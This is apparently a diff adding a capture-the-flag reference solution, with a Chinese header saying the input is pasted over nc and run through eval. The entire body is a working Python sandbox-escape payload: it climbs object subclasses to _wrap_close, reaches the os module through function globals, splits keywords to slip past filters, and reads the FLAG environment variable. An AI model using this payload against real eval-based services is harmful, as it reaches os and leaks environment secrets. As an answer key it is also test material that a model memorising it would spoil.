@@ -1,0 +1,3 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+getattr([x for x in ().__class__.__base__.__subclasses__() if x.__name__=='_wrap_'+'clo'+'se'][0].__init__.__globals__['s'+'ys'].modules['o'+'s'], 'envi'+'ron')['F'+'LAG']
